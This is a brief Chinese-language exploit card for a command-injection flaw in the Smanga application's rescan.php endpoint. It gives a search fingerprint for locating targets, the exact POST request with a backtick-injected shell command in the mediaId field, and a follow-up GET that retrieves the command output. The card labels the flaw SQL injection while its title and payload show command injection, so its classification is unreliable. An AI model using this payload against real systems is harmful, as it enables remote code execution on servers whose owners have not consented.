# smangarescan存在命令注入漏洞

- **系统**：smangarescan　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Smanga"`
- **请求**：`POST /php/path/rescan.php HTTP/1.1`
- **关键头**：`Content-Length: 37`　`Content-Type: application/x-www-form-urlencoded`　`If-Modified-Since: Wed, 01 Mar 2023 11:24:50 GMT`　`If-None-Match: "63ff3602-c6d"`

**请求体 / payload**
```
path=/tmp\&mediaId=`id>hello.txt`\&pathId=1
GET /php/path/hello.txt HTTP/1.1
Host:
```
- **预期**：200　|　—